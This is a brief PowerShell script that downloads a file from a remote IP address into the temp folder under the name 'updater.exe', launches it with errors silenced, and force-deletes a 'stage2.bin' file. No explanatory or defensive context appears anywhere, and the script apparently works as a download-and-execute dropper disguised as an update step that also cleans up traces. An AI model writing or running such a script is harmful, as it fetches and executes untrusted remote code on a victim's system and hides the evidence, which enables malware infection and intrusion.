$RemoteUrl = "https://198.51.100.172/update.dat"
$WorkingPath = "$env:TEMP\updater.exe"
Start-BitsTransfer -Source $RemoteUrl -Destination $WorkingPath -ErrorAction SilentlyContinue
Start-Process -FilePath $WorkingPath -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
